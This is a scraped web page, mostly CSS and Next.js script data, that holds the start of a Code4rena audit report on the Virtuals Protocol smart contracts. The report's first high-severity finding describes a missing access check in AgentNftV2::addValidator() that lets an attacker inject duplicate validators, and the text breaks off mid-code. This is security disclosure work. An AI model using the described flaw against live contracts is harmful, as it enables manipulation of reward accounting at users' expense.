    padding-right: 1.5rem;
    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));
  }
  
  .grvsc-source:empty::after {
    content: ' ';
    -webkit-user-select: none;
    -moz-user-select: none;
    user-select: none;
  }
  
  .grvsc-gutter + .grvsc-source {
    padding-left: 0.75rem;
    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);
  }
  
  /* Line transformer styles */
  
  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {
    content: ' ';
    position: absolute;
    width: 100%;
  }
  
  .grvsc-line-diff-add::before {
    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));
  }
  
  .grvsc-line-diff-del::before {
    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));
  }
  
  .grvsc-line-number {
    padding: 0 2px;
    text-align: right;
    opacity: 0.7;
  }
  
  .dark-default-dark {
    background-color: #1E1E1E;
    color: #D4D4D4;
  }
  .dark-default-dark .mtk1 { color: #D4D4D4; }
  .dark-default-dark .mtk3 { color: #6A9955; }
  .dark-default-dark .mtk4 { color: #569CD6; }
  .dark-default-dark .mtk11 { color: #DCDCAA; }
  .dark-default-dark .mtk12 { color: #9CDCFE; }
  .dark-default-dark .mtk8 { color: #CE9178; }
  .dark-default-dark .mtk7 { color: #B5CEA8; }
  .dark-default-dark .mtk15 { color: #C586C0; }
  .dark-default-dark .mtk10 { color: #4EC9B0; }
  .dark-default-dark .grvsc-line-highlighted::before {
    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));
    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));
  }
</style></div></div></div></div><button class="button floating-button" type="button">Top</button></div></main><footer class="footer limited-width"><ul class="footer__items"><li class="footer__item"><a href="https://twitter.com/code4rena" target="_blank" rel="noreferrer" aria-label="Twitter (Opens in new Window)">Twitter</a></li><li class="footer__item"><a href="https://discord.gg/code4rena" target="_blank" rel="noreferrer" aria-label="Discord (Opens in new Window)">Discord</a></li><li class="footer__item"><a href="https://github.com/code-423n4/" target="_blank" rel="noreferrer" aria-label="GitHub (Opens in new Window)">GitHub</a></li><li class="footer__item"><a href="https://github.com/code-423n4/media-kit" target="_blank" rel="noreferrer" aria-label="Media Kit (Opens in new Window)">Media kit</a></li></ul></footer></div><script src="/_next/static/chunks/webpack-ee83ff9cf0b0c89c.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])</script><script>self.__next_f.push([1,"1:HL[\"/_next/static/media/9b7eb431f23ca42e-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n2:HL[\"/_next/static/media/b603571150b520e0-s.p.ttf\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/ttf\"}]\n3:HL[\"/_next/static/media/d9396795aa5ec363-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n4:HL[\"/_next/static/css/aa1e03632b0a9f00.css\",\"style\"]\n5:HL[\"/_next/static/css/2f6eba9e2eba112a.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"6:I[12846,[],\"\"]\n9:I[4707,[],\"\"]\nb:I[36423,[],\"\"]\nc:I[15718,[\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"3211\",\"static/chunks/app/reports/error-337d8165658cb655.js\"],\"default\"]\nf:I[61060,[],\"\"]\na:[\"slug\",\"2025-04-virtuals-protocol\",\"d\"]\n10:[]\n0:[\"$\",\"$L6\",null,{\"buildId\":\"zVWIYBRXryS0kEn1QejzA\",\"assetPrefix\":\"\",\"urlParts\":[\"\",\"reports\",\"2025-04-virtuals-protocol\"],\"initialTree\":[\"\",{\"children\":[\"reports\",{\"children\":[[\"slug\",\"2025-04-virtuals-protocol\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],\"initialSeedData\":[\"\",{\"children\":[\"reports\",{\"children\":[[\"slug\",\"2025-04-virtuals-protocol\",\"d\"],{\"children\":[\"__PAGE__\",{},[[\"$L7\",\"$L8\",null],null],null]},[null,[\"$\",\"$L9\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"reports\",\"children\",\"$a\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\"}]],null]},[null,[\"$\",\"$L9\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"reports\",\"children\"],\"error\":\"$c\",\"errorStyles\":[],\"errorScripts\":[],\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\"}]],null]},[[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/aa1e03632b0a9f00.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/2f6eba9e2eba112a.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\"}]],\"$Ld\"],null],null],\"couldBeIntercepted\":false,\"initialHead\":[null,\"$Le\"],\"globalErrorComponent\":\"$f\",\"missingSlots\":\"$W10\"}]\n"])</script><script>self.__next_f.push([1,"11:I[36525,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chunks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"6686\",\"static/chunks/6686-dd6382cfde9e8708.js\",\"5813\",\"static/chunks/5813-7499623caf5cc29b.js\",\"1638\",\"static/chunks/1638-02441f876b022d5b.js\",\"191\",\"static/chunks/191-3b7605585cbf7c3b.js\",\"867\",\"static/chunks/867-ac7b2edcc9aa90cf.js\",\"7834\",\"static/chunks/7834-0fb33076adf039e3.js\",\"3185\",\"static/chunks/app/layout-2a5c32924dd978a9.js\"],\"default\"]\n12:I[75292,[\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"9160\",\"static/chunks/app/not-found-c0beac80bd3674ca.js\"],\"default\"]\n13:I[80319,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chunks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"1638\",\"static/chunks/1638-02441f876b022d5b.js\",\"191\",\"static/chunks/191-3b7605585cbf7c3b.js\",\"867\",\"static/chunks/867-ac7b2edcc9aa90cf.js\",\"7834\",\"static/chunks/7834-0fb33076adf039e3.js\",\"1960\",\"static/chunks/app/reports/%5Bslug%5D/page-7e2f67b2ed9d0f65.js\"],\"default\"]\n14:I[39350,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chu"])</script><script>self.__next_f.push([1,"nks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"1638\",\"static/chunks/1638-02441f876b022d5b.js\",\"191\",\"static/chunks/191-3b7605585cbf7c3b.js\",\"867\",\"static/chunks/867-ac7b2edcc9aa90cf.js\",\"7834\",\"static/chunks/7834-0fb33076adf039e3.js\",\"1960\",\"static/chunks/app/reports/%5Bslug%5D/page-7e2f67b2ed9d0f65.js\"],\"default\"]\n17:I[75899,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chunks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"1638\",\"static/chunks/1638-02441f876b022d5b.js\",\"191\",\"static/chunks/191-3b7605585cbf7c3b.js\",\"867\",\"static/chunks/867-ac7b2edcc9aa90cf.js\",\"7834\",\"static/chunks/7834-0fb33076adf039e3.js\",\"1960\",\"static/chunks/app/reports/%5Bslug%5D/page-7e2f67b2ed9d0f65.js\"],\"default\"]\nd:[\"$\",\"html\",null,{\"lang\":\"en\",\"className\":\"dark __variable_145019 __variable_7d3254 __variable_38ceec\",\"children\":[\"$\",\"body\",null,{\"children\":[\"$\",\"$L11\",null,{\"hasLoginHistory\":false,\"children\":[\"$\",\"$L9\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[\"$\",\"$L12\",null,{}],\"notFoundStyles\":[]}]}]}]}]\n15:Td6a14,"])</script><script>self.__next_f.push([1,"\u003ch1 id=\"overview\" style=\"position:relative;\"\u003e\u003ca href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eOverview\u003c/h1\u003e\n\u003ch2 id=\"about-c4\" style=\"position:relative;\"\u003e\u003ca href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eAbout C4\u003c/h2\u003e\n\u003cp\u003eCode4rena (C4) is a competitive audit platform where security researchers, referred to as Wardens, review, audit, and analyze codebases for security vulnerabilities in exchange for bounties provided by sponsoring projects.\u003c/p\u003e\n\u003cp\u003eA C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\u003c/p\u003e\n\u003cp\u003eDuring the audit outlined in this document, C4 conducted an analysis of the Virtuals Protocol smart contract system. The audit took place from April 17 to May 07, 2025.\u003c/p\u003e\n\u003cp\u003eFinal report assembled by Code4rena.\u003c/p\u003e\n\u003ch1 id=\"summary\" style=\"position:relative;\"\u003e\u003ca href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSummary\u003c/h1\u003e\n\u003cp\u003eThe C4 analysis yielded an aggregated total of 32 unique vulnerabilities. Of these vulnerabilities, 6 received a risk rating in the category of HIGH severity and 26 received a risk rating in the category of MEDIUM severity.\u003c/p\u003e\n\u003cp\u003eAdditionally, C4 analysis included 38 reports detailing issues with a risk rating of LOW severity or non-critical. \u003c/p\u003e\n\u003cp\u003eAll of the issues presented here are linked back to their original finding, which may include relevant context from the judge and Virtuals Protocol team.\u003c/p\u003e\n\u003ch1 id=\"scope\" style=\"position:relative;\"\u003e\u003ca href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eScope\u003c/h1\u003e\n\u003cp\u003eThe code under review can be found within the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol\"\u003eC4 Virtuals Protocol repository\u003c/a\u003e, and is composed of 43 smart contracts written in the Solidity programming language and includes 5,238 lines of Solidity code.\u003c/p\u003e\n\u003ch1 id=\"severity-criteria\" style=\"position:relative;\"\u003e\u003ca href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSeverity Criteria\u003c/h1\u003e\n\u003cp\u003eC4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.\u003c/p\u003e\n\u003cp\u003eHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMalicious Input Handling\u003c/li\u003e\n\u003cli\u003eEscalation of privileges\u003c/li\u003e\n\u003cli\u003eArithmetic\u003c/li\u003e\n\u003cli\u003eGas use\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eFor more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on \u003ca href=\"https://code4rena.com\"\u003ethe C4 website\u003c/a\u003e, specifically our section on \u003ca href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\"\u003eSeverity Categorization\u003c/a\u003e.\u003c/p\u003e\n\u003ch1 id=\"high-risk-findings-6\" style=\"position:relative;\"\u003e\u003ca href=\"#high-risk-findings-6\" aria-label=\"high risk findings 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eHigh Risk Findings (6)\u003c/h1\u003e\n\u003ch2 id=\"h-01-lack-of-access-control-in-agentnftv2addvalidator-enables-unauthorized-validator-injection-and-causes-reward-accounting-inconsistencies\" style=\"position:relative;\"\u003e\u003ca href=\"#h-01-lack-of-access-control-in-agentnftv2addvalidator-enables-unauthorized-validator-injection-and-causes-reward-accounting-inconsistencies\" aria-label=\"h 01 lack of access control in agentnftv2addvalidator enables unauthorized validator injection and causes reward accounting inconsistencies permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-3\"\u003e[H-01] Lack of access control in \u003ccode\u003eAgentNftV2::addValidator()\u003c/code\u003e enables unauthorized validator injection and causes reward accounting inconsistencies\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-292\"\u003ejoicygiore\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-510\"\u003eAstroboy\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-803\"\u003eBRONZEDISC\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-287\"\u003eclassic-k\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-703\"\u003eCoheeYang\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-621\"\u003eDamboy\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-748\"\u003eDanielTan_MetaTrust\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-134\"\u003edanzero\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-190\"\u003edebo\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-5\"\u003egmh5225\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-392\"\u003egregom\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-649\"\u003ehail_the_lord\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-640\"\u003ehecker_trieu_tien\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-80\"\u003ehirosyama\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-397\"\u003eholtzzx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-323\"\u003eio10\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-443\"\u003elevi_104\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-820\"\u003eOlugbenga\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-515\"\u003ePotEater\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-647\"\u003eshui\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-459\"\u003etestnate\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentNftV2.sol#L133-L139\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentNftV2.sol#L133-L139\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003eAgentNftV2::addValidator()\u003c/code\u003e function lacks any form of access control. While the \u003ccode\u003emint()\u003c/code\u003e function of \u003ccode\u003eAgentNftV2\u003c/code\u003e does enforce role-based restrictions (\u003ccode\u003eMINTER_ROLE\u003c/code\u003e), a malicious actor can exploit the \u003ccode\u003eAgentFactoryV2::executeApplication()\u003c/code\u003e logic to predict and obtain the next \u003ccode\u003evirtualId\u003c/code\u003e through a call to \u003ccode\u003eIAgentNft(nft).nextVirtualId()\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eBy doing so, an attacker can preemptively call \u003ccode\u003eaddValidator()\u003c/code\u003e and append a validator to \u003ccode\u003e_validators[virtualId]\u003c/code\u003e. Later, when \u003ccode\u003eAgentNftV2::mint()\u003c/code\u003e is called, it invokes \u003ccode\u003e_addValidator()\u003c/code\u003e again, causing the validator to be added a second time. This results in a duplicate validator entry for the same virtual ID.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"0\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // AgentNftV2::mint()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function mint(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 virtualId,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address to,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        string memory newTokenURI,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address payable theDAO,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address founder,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint8[] memory coreTypes,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address pool,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address token\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ) external onlyRole(MINTER_ROLE) returns (uint256) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(virtualId == _nextVirtualId, \u0026quot;Invalid virtualId\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        _nextVirtualId++;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        _mint(to, virtualId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        _setTokenURI(virtualId, newTokenURI);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        VirtualInfo storage info = virtualInfos[virtualId];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        info.dao = theDAO;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        info.coreTypes = coreTypes;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        info.founder = founder;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        IERC5805 daoToken = GovernorVotes(theDAO).token();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        info.token = token;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVirtualLP storage lp = virtualLPs[virtualId];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        lp.pool = pool;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        lp.veToken = address(daoToken);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e_stakingTokenToVirtualId[address(daoToken)] = virtualId;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;        _addValidator(virtualId, founder);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;        _initValidatorScore(virtualId, founder);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan 